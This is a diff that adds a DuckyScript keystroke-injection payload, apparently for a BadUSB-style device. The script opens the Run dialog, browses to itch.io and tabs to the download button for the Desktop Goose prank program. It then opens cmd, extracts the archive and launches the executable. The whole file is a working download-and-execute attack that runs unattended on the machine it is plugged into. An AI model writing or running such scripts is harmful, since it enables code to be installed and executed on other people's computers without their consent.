@@ -1,0 +1,95 @@
+REM Download and execute anoying goose
+
+GUI r
+DELAY 500
+STRING https://samperson.itch.io/desktop-goose
+ENTER
+
+REM wait for the page to load
+DELAY 5000
+
+REM go to the download button
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+
+REM navigating modal
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+
+REM navigating download page
+DELAY 2000
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+
+REM download delay
+DELAY 5000
+
+REM close current tab
+CONTROL W
+DELAY 100
+
+REM open the terminal
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+
+REM
+STRING cd %USERPROFILE%\Downloads
+ENTER
+DELAY 100
+
+STRING tar -xf "Desktop Goose v0.31.zip"
+ENTER
+DELAY 2000
+
+STRING cd "Desktop Goose v0.31\DesktopGoose v0.31" && GooseDesktop.exe
+ENTER
+DELAY 100
+
+STRING exit
+ENTER
+
+
+
